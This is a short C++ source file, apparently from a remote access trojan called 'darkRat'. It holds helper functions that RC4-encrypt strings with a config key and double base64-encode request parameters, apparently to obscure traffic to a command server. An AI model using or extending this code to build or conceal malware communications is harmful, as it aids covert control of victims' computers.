#include <cstdint>
#include <string>
#include "Base64.h"
//TODO AES CURRENT XOR



class XOR {
	uint32_t regs[4];

public:

	static std::string Decrypt(std::string toDecrypt) {
		darkRat::config::config config = darkRat::config::load();
		std::string enckey = config.encryptionKey;
		absent::crypto::RC4 rc4;
		//std::cout << toDecrypt << std::endl;
		toDecrypt = rc4.crypt(base64_decode(toDecrypt.c_str()), enckey.c_str());
		char* c_write = &toDecrypt[0u];
		//std::cout << toDecrypt << std::endl;
		return toDecrypt;

	}	
	


	static std::string EnCrypt(std::string toDecrypt) {
		darkRat::config::config config = darkRat::config::load();
		std::string enckey = config.encryptionKey;
		absent::crypto::RC4 rc4;

		std::cout << toDecrypt << std::endl;
		toDecrypt = rc4.crypt(toDecrypt, enckey.c_str());
		//toDecrypt = absent::crypto::b64::encode(toDecrypt.c_str());

		char* c_writ2e = &toDecrypt[0u];
		std::cout << toDecrypt << std::endl;
		//std::cout << toDecrypt << std::endl;
		return toDecrypt;

	}

	static std::string encryptReqeust(std::string params) {
		std::string encryptedPostParams = base64_encode((const unsigned char*)params.c_str(), params.length());
		std::string finalPost = base64_encode((const unsigned char*)encryptedPostParams.c_str(), encryptedPostParams.length());
		return finalPost;
	}

};

